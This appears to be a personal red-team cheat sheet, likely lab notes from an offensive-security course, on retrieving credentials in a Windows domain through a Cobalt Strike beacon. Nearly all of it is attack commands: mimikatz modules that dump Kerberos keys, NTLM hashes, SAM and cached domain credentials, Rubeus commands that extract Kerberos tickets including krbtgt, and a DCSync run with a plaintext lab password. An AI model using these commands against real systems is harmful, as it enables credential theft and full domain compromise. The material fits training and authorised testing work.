# How to Retrieve Credentials 
## plaintext (username & password), hashes (NTLM, AES, DCC, NetNTLM, etc), and Kerberos tickets.

Use ```mimikatz```!

First try:
```
beacon> mimikatz !sekurlsa::ekeys
```
It will dump the Kerberos encryption keys of currently logged on users. The AES256 key is the one we want.

otherwise:
```
beacon> mimikatz !sekurlsa::logonpasswords
```
This module can retrieve NTLM hashes that can be used for _Pass the Hash_ or even cracking.

Another way to get NTLM hashes is via SAM DAtabase:
```
beacon> mimikatz !lsadump::sam
```

DCC can be used too. Little trickiest. :)
```
beacon> mimikatz !lsadump::cache
```
Domain Cached Credentials (DCC) can be used where domain credentials are required to logon to a machine, even whilst it's disconnected from the domain.
You can't get the NTLM hash but you need to build the hash ($DCC2$<iterations>#<username>#<hash>) and then crack it.
 
Kerberos ticket!
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```
```triage``` command will list all the Kerberos tickets in your current session.
we can specify the /luid and /service parameters too and get tickets in base64 encoded format.
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt
```

Lastly, DCSync 
```
beacon> make_token DEV\nlamb F3rrari
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```

is a technique which leverages this protocol to extract username and credential data from a DC
